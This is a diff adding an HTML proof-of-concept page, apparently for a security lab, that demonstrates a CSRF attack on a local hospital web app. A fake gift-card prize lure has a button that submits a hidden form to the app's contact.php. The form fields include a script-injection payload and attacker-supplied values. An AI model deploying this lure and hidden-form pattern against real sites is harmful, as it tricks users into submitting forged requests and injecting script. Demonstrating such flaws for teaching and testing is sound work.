@@ -1,0 +1,60 @@
+<!DOCTYPE html>
+<html>
+<head>
+    <title>Malicious Website - CSRF Attack Demo</title>
+    <style>
+        body {
+            font-family: Arial, sans-serif;
+            background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
+            padding: 50px;
+            color: white;
+        }
+        .fake-content {
+            background: white;
+            color: #333;
+            padding: 30px;
+            border-radius: 10px;
+            max-width: 600px;
+            margin: 0 auto;
+        }
+        h1 { color: #667eea; }
+        .prize { 
+            background: #ffd700;
+            padding: 20px;
+            border-radius: 5px;
+            text-align: center;
+            font-size: 24px;
+            font-weight: bold;
+            color: #333;
+        }
+    </style>
+</head>
+<body>
+    <div class="fake-content">
+        <h1>🎉 Congratulations!</h1>
+        <div class="prize">
+            You've Won a $1000 Gift Card!
+        </div>
+        <p>Click the button below to claim your prize:</p>
+        <button onclick="document.getElementById('malicious').submit();" style="background: #667eea; color: white; padding: 15px 30px; border: none; border-radius: 5px; font-size: 18px; cursor: pointer;">
+            Claim Prize Now!
+        </button>
+        
+        <!-- Hidden malicious form that attacks the hospital system -->
+        <form id="malicious" action="http://localhost:8080/hospital/contact.php" method="POST" style="display:none;">
+            <input type="hidden" name="txtName" value="<script>alert('HACKED')</script>">
+            <input type="hidden" name="txtEmail" value="hacker@attacker.com">
+            <input type="hidden" name="txtPhone" value="6666666666">
+            <input type="hidden" name="txtMsg" value="This message was injected via CSRF attack! Your system is vulnerable!">
+            <input type="hidden" name="btnSubmit" value="Send Message">
+            <!-- NOTE: No CSRF token because attacker doesn't have access to it -->
+        </form>
+        
+        <p style="margin-top: 30px; font-size: 12px; color: #999;">
+            <strong>Note:</strong> This is a demonstration of a CSRF attack. 
+            When the user clicks "Claim Prize", a hidden form attempts to 
+            submit malicious data to the hospital contact form.
+        </p>
+    </div>
+</body>
+</html>
